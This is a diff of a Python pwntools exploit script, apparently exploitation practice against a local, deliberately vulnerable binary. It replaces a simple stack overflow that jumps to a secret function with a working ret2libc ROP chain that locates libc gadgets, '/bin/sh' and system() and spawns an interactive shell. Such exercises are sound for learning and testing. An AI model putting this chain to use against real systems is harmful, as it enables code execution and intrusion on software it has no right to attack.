@@ -1,27 +1,57 @@
 #!/usr/bin/env python3
 
-# gcc -o overflow overflow.c -fno-PIE -no-pie -fno-stack-protector -fcf-protection=none -g
-
 from pwn import *
-import struct
 
-bin_file = './overflow'
-payload_file = './payload.bin'
+context.arch = "amd64"
 
-binf = ELF(bin_file)
+elf = ELF("./rop-chain")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
-def main():
-    payload = b'\x00' * 88
-    payload += struct.pack('<Q', binf.functions['secret_function'].address)
+rop_libc = ROP(libc)
 
-    # バイナリとしてファイルに保存
-    with open(payload_file, 'wb') as f:
-        f.write(payload)
+# libc offsets
+pop_rdi_offset = rop_libc.find_gadget(["pop rdi", "ret"]).address
+bin_sh_offset  = next(libc.search(b"/bin/sh"))
+system_offset  = libc.symbols["system"]
 
-    # argv[1] には「ファイル名」を渡す
-    conn = process([bin_file, payload_file])
+print("pop rdi; ret =", hex(pop_rdi_offset))
+print("/bin/sh       =", hex(bin_sh_offset))
+print("system        =", hex(system_offset))
 
-    print(conn.recvall(timeout=2))
+# Start process
+p = process("./rop-chain")
 
-if __name__ == '__main__':
-    main()
+# Get libc base of THIS process
+for path, addr in p.libs().items():
+    if path.endswith("libc.so.6"):
+        libc_base = addr
+        break
+
+print("libc_base =", hex(libc_base))
+
+# Runtime addresses
+pop_rdi = libc_base + pop_rdi_offset
+bin_sh  = libc_base + bin_sh_offset
+system  = libc_base + system_offset
+
+print("pop rdi =", hex(pop_rdi))
+print("/bin/sh =", hex(bin_sh))
+print("system  =", hex(system))
+
+# ret gadget for stack alignment
+rop_elf = ROP(elf)
+ret = rop_elf.find_gadget(["ret"]).address
+
+print("ret     =", hex(ret))
+
+# ROP chain
+payload = flat(
+    b"A" * 72,
+    ret,
+    pop_rdi,
+    bin_sh,
+    system,
+)
+
+p.send(payload)
+p.interactive()
